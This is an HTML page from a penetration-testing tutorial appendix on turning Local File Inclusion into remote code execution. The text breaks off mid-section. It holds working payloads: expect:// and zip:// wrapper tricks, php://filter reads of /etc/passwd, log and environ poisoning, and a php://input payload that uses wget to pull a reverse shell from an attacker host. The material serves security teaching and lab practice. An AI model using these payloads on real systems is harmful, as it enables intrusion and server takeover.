@@ -1,0 +1,1399 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-R21NVEB2EY"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-R21NVEB2EY');
+    </script>
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Appendix &mdash; tech.bitvijays.com 2.0.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=19f00094" />
+
+  
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script src="../_static/documentation_options.js?v=51b770b3"></script>
+        <script src="../_static/doctools.js?v=888ff710"></script>
+        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
+        <script src="../_static/debug.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="Binary Exploitation" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html" />
+    <link rel="prev" title="Tips and Tricks" href="LFC-VM-P3-TipsAndTricks.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../index.html" class="icon icon-home">
+            tech.bitvijays.com
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">The Essentials</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0A-CyberSecurityEnterprise.html">Cybersecurity in an Enterprise</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0B-LinuxEssentials.html">Linux Basics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0C-CloudEssentials.html">Cloud Infrastructure Technologies</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0E-OpenSource.html">Open Source Concepts</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0D-SecureSoftware.html">Secure Software Development Fundamentals</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_The_Essentials/LFF-ESS-P0F-IndustrialControlSystems.html">Industrial Control Systems</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Infrastructure Pentest</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P1-IntelligenceGathering.html">Intelligence Gathering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P2-VulnerabilityAnalysis.html">Vulnerability Analysis</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P5-Reporting.html">Reporting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Infrastructure_Pentest/LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Appendix</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#a1-local-file-inclusion">A1: Local File Inclusion</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#tools">Tools</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#filtering-in-lfi">Filtering in LFI</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#lfi-to-remote-code-execution">LFI to Remote Code Execution</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#file-upload-forms-functions">File upload forms/ functions</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-wrapper-expect-command">PHP wrapper expect://command</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-wrapper-zip">PHP Wrapper zip</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-wrapper-phar">PHP Wrapper phar</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-wrapper-php-file">PHP wrapper php://file</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-wrapper-php-filter">PHP wrapper php://filter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-input-stream">PHP input:// stream</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#data-text-plain-base64-command">data://text/plain;base64,command</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#proc-self-environ">/proc/self/environ</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#proc-self-fd">/proc/self/fd</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#control-over-php-session-values">Control over PHP Session Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#email-server">Email Server</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#a2-file-upload">A2: File Upload</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#examples">Examples</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#simple-file-upload">Simple File Upload</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#simple-file-upload-with-verifying-image-type">Simple File Upload - With verifying image type</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#modifying-file-upload-page">Modifying File Upload Page</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#iis-web-config-upload">IIS - Web.config Upload</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#a3-transferring-files-from-linux-to-windows-post-exploitation">A3: Transferring Files from Linux to Windows (post-exploitation)</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#smb">SMB</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#smb-server-attacker">SMB Server - Attacker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#accessing-the-share-linux">Accessing the share - Linux</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#accessing-the-share-windows">Accessing the share - Windows</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#copying-the-files-windows">Copying the Files - Windows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#http">HTTP</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-server">Setting up the Server</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#accessing-the-server-windows">Accessing the Server - Windows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#ftp">FTP</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id2">Setting up the Server</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#access-using-ftp">Access using FTP</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#tftp">TFTP</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id3">Setting up the Server</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#accessing-the-share">Accessing the Share</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#installing-tftp-windows">Installing tftp - Windows</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#a4-linux-group-membership-issues">A4: Linux Group Membership Issues</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#docker-group">Docker Group</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#create-a-dockerfile">Create a Dockerfile</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#build-the-docker">Build the Docker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#become-root">Become root?</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#video">Video</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#disk">Disk</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#set-file-system">Set file system</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#list-files">List files</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#list-the-files-with-a-long-listing">List the files with a long listing</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#dump-the-contents-of-file1">Dump the contents of file1</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#dump-an-inode-to-a-file">Dump an inode to a file</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#lxd">LXD</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#exploiting">Exploiting</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#a5-coding-languages-tricks">A5: Coding Languages Tricks</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#python">Python</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#pickle">Pickle</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#php">PHP</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#preg-replace">Preg_Replace</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#complex-curly-syntax">Complex Curly Syntax</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#xdebug">Xdebug</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#type-juggling-magic-bytes">Type Juggling/ Magic Bytes</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#lua">LUA</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#a6-metasploit-module-writing">A6: Metasploit Module Writing?</a></li>
+</ul>
+</li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html">Binary Exploitation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Forensics.html">Forensics</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-ReverseEngineering.html">Reverse Engineering</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Cryptography.html">Cryptography</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">tech.bitvijays.com</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Appendix</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="appendix">
+<h1>Appendix<a class="headerlink" href="#appendix" title="Link to this heading"></a></h1>
+<section id="a1-local-file-inclusion">
+<h2>A1: Local File Inclusion<a class="headerlink" href="#a1-local-file-inclusion" title="Link to this heading"></a></h2>
+<p>Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.</p>
+<section id="tools">
+<h3>Tools<a class="headerlink" href="#tools" title="Link to this heading"></a></h3>
+<p>To test LFI, RFI, we can also use <a class="reference external" href="http://tools.kali.org/web-applications/uniscan">Uniscan</a> Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">uniscan</span> <span class="o">-</span><span class="n">h</span>
+<span class="n">OPTIONS</span><span class="p">:</span>
+  <span class="o">-</span><span class="n">h</span>  <span class="n">help</span>
+  <span class="o">-</span><span class="n">u</span>  <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span> <span class="n">example</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+  <span class="o">-</span><span class="n">f</span>  <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">url</span><span class="s1">&#39;s</span>
+  <span class="o">-</span><span class="n">b</span>  <span class="n">Uniscan</span> <span class="n">go</span> <span class="n">to</span> <span class="n">background</span>
+  <span class="o">-</span><span class="n">q</span>  <span class="n">Enable</span> <span class="n">Directory</span> <span class="n">checks</span>
+  <span class="o">-</span><span class="n">w</span>  <span class="n">Enable</span> <span class="n">File</span> <span class="n">checks</span>
+  <span class="o">-</span><span class="n">e</span>  <span class="n">Enable</span> <span class="n">robots</span><span class="o">.</span><span class="n">txt</span> <span class="ow">and</span> <span class="n">sitemap</span><span class="o">.</span><span class="n">xml</span> <span class="n">check</span>
+  <span class="o">-</span><span class="n">d</span>  <span class="n">Enable</span> <span class="n">Dynamic</span> <span class="n">checks</span>
+  <span class="o">-</span><span class="n">s</span>  <span class="n">Enable</span> <span class="n">Static</span> <span class="n">checks</span>
+  <span class="o">-</span><span class="n">r</span>  <span class="n">Enable</span> <span class="n">Stress</span> <span class="n">checks</span>
+  <span class="o">-</span><span class="n">i</span>  <span class="o">&lt;</span><span class="n">dork</span><span class="o">&gt;</span> <span class="n">Bing</span> <span class="n">search</span>
+  <span class="o">-</span><span class="n">o</span>  <span class="o">&lt;</span><span class="n">dork</span><span class="o">&gt;</span> <span class="n">Google</span> <span class="n">search</span>
+  <span class="o">-</span><span class="n">g</span>  <span class="n">Web</span> <span class="n">fingerprint</span>
+  <span class="o">-</span><span class="n">j</span>  <span class="n">Server</span> <span class="n">fingerprint</span>
+
+<span class="n">usage</span><span class="p">:</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span> <span class="o">-</span><span class="n">qweds</span>
+<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">f</span> <span class="n">sites</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">bqweds</span>
+<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">i</span> <span class="n">uniscan</span>
+<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&quot;ip:xxx.xxx.xxx.xxx&quot;</span>
+<span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">o</span> <span class="s2">&quot;inurl:test&quot;</span>
+<span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span> <span class="o">-</span><span class="n">r</span>
+</pre></div>
+</div>
+<p>There’s another tool called <a class="reference external" href="https://tools.kali.org/web-applications/fimap">fimap</a>. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don’t have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.</p>
+</div>
+<section id="filtering-in-lfi">
+<h4>Filtering in LFI<a class="headerlink" href="#filtering-in-lfi" title="Link to this heading"></a></h4>
+<p>Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly.</p>
+<p>For example: the below code only includes the file which are named secret</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
+  $file = @$_GET[&#39;filname&#39;];
+  if(strlen($file) &gt; 55)
+     exit(&quot;File name too long.&quot;);
+  $fileName = basename($file);
+  if(!strpos($file, &quot;secret&quot;))
+    exit(&quot;No secret is selected.&quot;);
+  echo &quot;&lt;pre&gt;&quot;;
+  include($file);
+  echo &quot;&lt;/pre&gt;&quot;;
+?&gt;
+</pre></div>
+</div>
+</section>
+</section>
+<section id="lfi-to-remote-code-execution">
+<h3>LFI to Remote Code Execution<a class="headerlink" href="#lfi-to-remote-code-execution" title="Link to this heading"></a></h3>
+<p>Mainly taken from <a class="reference external" href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI-Cheat-Sheet</a> , <a class="reference external" href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/">Exploiting PHP File Inclusion – Overview</a> and <a class="reference external" href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Upgrade from LFI to RCE via PHP Sessions</a></p>
+<p>There are variety of different tricks to turn your LFI into RCE. Using</p>
+<section id="file-upload-forms-functions">
+<h4>File upload forms/ functions<a class="headerlink" href="#file-upload-forms-functions" title="Link to this heading"></a></h4>
+<p>Figure out if there are any upload forms or functions, we will upload your malicious code to the victim server, which can be executed.</p>
+</section>
+<section id="php-wrapper-expect-command">
+<h4>PHP wrapper expect://command<a class="headerlink" href="#php-wrapper-expect-command" title="Link to this heading"></a></h4>
+<p>Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.</p>
+<p>An example of PHP expect:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=expect://ls
+</pre></div>
+</div>
+<p>If PHP expect wrapper is disabled, below error is encountered.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Warning: include(): Unable to find the wrapper &quot;expect&quot; - did you forget to enable it when you&lt;br&gt; configured PHP? in /var/www/fileincl/example1.php on line 7
+Warning: include(): Unable to find the&lt;br&gt; wrapper &quot;expect&quot; - did you forget to enable it when you configured PHP? in &lt;br&gt; /var/www/fileincl/example1.php on line 7
+Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7
+Warning: include(): Failed opening &#39;expect://ls&#39; for inclusion (include_path=&#39;.:/usr/share/php:/usr/share/pear&#39;) in /var/www/fileincl/example1.php on line 7
+</pre></div>
+</div>
+</section>
+<section id="php-wrapper-zip">
+<h4>PHP Wrapper zip<a class="headerlink" href="#php-wrapper-zip" title="Link to this heading"></a></h4>
+<p>Let’s say there is a upload functionality on the victim machine, however the file saved doesn’t have executeable permission, in that case if we upload a zip file containing a shellcode such as</p>
+<p>Creating a php payload for listing current directory files (There can be other payload also. For example, php meterpreter, if the “system” is blocked use, scandir() for directory listing etc. )</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;&lt;?php system(&quot;</span><span class="n">ls</span><span class="s2">&quot;); ?&gt;&quot;</span> <span class="o">&gt;</span> <span class="n">shell</span><span class="o">.</span><span class="n">php</span>
+</pre></div>
+</div>
+<p>and</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">zip</span> <span class="n">shell</span><span class="o">.</span><span class="n">zip</span> <span class="n">shell</span><span class="o">.</span><span class="n">php</span>
+</pre></div>
+</div>
+<p>Now, if we upload this zip file somehow to the victim machine and know it’s location (Let’s say it got uploaded in /uploads) and filename (is def506bd2176265e006f2db3d7b4e9db11c459c1), we can do remote code execution</p>
+<p><a class="reference external" href="http://php.net/manual/en/wrappers.compression.php">Zip Usage</a></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">zip</span><span class="p">:</span><span class="o">//</span><span class="n">archive</span><span class="o">.</span><span class="n">zip</span><span class="c1">#dir/file.txt</span>
+</pre></div>
+</div>
+<p>Burp Request</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>GET /?parameter=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
+Host: 10.50.66.93
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+%23 is the #
+</pre></div>
+</div>
+<p>and we get RCE</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="n">upload</span><span class="o">.</span><span class="n">php</span>
+<span class="n">uploads</span>
+</pre></div>
+</div>
+<p>We may read more about it at <a class="reference external" href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up</a> or <a class="reference external" href="https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur">CodeGate General CTF 2015: Owlur</a> – Read other write-ups in this.</p>
+</section>
+<section id="php-wrapper-phar">
+<h4>PHP Wrapper phar<a class="headerlink" href="#php-wrapper-phar" title="Link to this heading"></a></h4>
+<p>RCE can also be done using <a class="reference external" href="http://php.net/manual/en/phar.using.stream.php">Using Phar Archives: the phar stream wrapper</a></p>
+</section>
+<section id="php-wrapper-php-file">
+<h4>PHP wrapper php://file<a class="headerlink" href="#php-wrapper-php-file" title="Link to this heading"></a></h4>
+</section>
+<section id="php-wrapper-php-filter">
+<h4>PHP wrapper php://filter<a class="headerlink" href="#php-wrapper-php-filter" title="Link to this heading"></a></h4>
+<p>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.</p>
+<p>The output is encoded using base64, so you’ll need to decode the output.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
+</pre></div>
+</div>
+<p>or</p>
+<p>We could use php filter to read the source code of a PHP File</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
+</pre></div>
+</div>
+<p>More information can be found at <a class="reference external" href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using PHP for file inclusion</a></p>
+</section>
+<section id="php-input-stream">
+<h4>PHP input:// stream<a class="headerlink" href="#php-input-stream" title="Link to this heading"></a></h4>
+<p>php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.</p>
+<p>Send your payload in the POST request using curl, burp.</p>
+<p>Example:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=php://input
+</pre></div>
+</div>
+<p>Post Data payload:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;? system(&#39;wget http://IP/php-reverse-shell.php -O /var/www/shell.php&#39;);?&gt;
+</pre></div>
+</div>
+<p>After uploading execute the reverse shell at</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span>
+</pre></div>
+</div>
+</section>
+<section id="data-text-plain-base64-command">
+<h4><a class="reference external" href="data://text/plain;base64,command">data://text/plain;base64,command</a><a class="headerlink" href="#data-text-plain-base64-command" title="Link to this heading"></a></h4>
+</section>
+<section id="proc-self-environ">
+<h4>/proc/self/environ<a class="headerlink" href="#proc-self-environ" title="Link to this heading"></a></h4>
+<p>If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.</p>
+</section>
+<section id="proc-self-fd">
+<h4>/proc/self/fd<a class="headerlink" href="#proc-self-fd" title="Link to this heading"></a></h4>
+<p>If it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer.</p>
+<p>This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc.
+Utilize <a class="reference external" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/Intruders/LFI-LogFileCheck.txt">LFI-LogFileCheck.txt</a> with Burp Intruder, and check for the returned page sizes.</p>
+</section>
+<section id="control-over-php-session-values">
+<h4>Control over PHP Session Values<a class="headerlink" href="#control-over-php-session-values" title="Link to this heading"></a></h4>
+<p>Let’s say, a vulnerable page is present with the post request</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
+Host: vulnerable.redacted.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
+Content-Length: 44
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+login=1&amp;user=admin&amp;pass=admin&amp;lang=en_us.php
+</pre></div>
+</div>
+<p>with LFI</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">login</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">user</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="k">pass</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">lang</span><span class="o">=../../../../../../../../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</pre></div>
+</div>
+<p>Now, the server store cookies</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">i56kgbsq9rm8ndg3qbarhsbm27</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span>
+<span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">user</span><span class="o">=</span><span class="n">admin</span><span class="p">;</span> <span class="n">expires</span><span class="o">=</span><span class="n">Mon</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Aug</span><span class="o">-</span><span class="mi">2018</span> <span class="mi">20</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">29</span> <span class="n">GMT</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span><span class="p">;</span> <span class="n">httponly</span>
